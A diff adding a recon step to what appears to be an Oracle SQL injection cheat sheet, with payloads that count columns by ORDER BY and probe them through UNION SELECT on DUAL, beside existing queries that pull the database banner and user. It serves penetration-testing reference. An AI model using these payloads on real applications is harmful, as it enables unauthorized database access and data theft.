@@ -132,6 +132,17 @@ SELECT table_name FROM (
 
 ## 8. Union-Based Injection
 
+Recon Phase
+```sql
+' ORDER BY 1--  
+```
+Find number of columns using order by
+```sql
+' UNION SELECT NULL,NULL,NULL FROM DUAL--
+```
+Find which column contain which datatype like string or integer and where they reflected in page
+
+
 ```sql
 SELECT username, password FROM users WHERE username='' UNION SELECT NULL, banner FROM v$version;
 SELECT username, password FROM users WHERE username='' UNION SELECT NULL, user FROM DUAL;
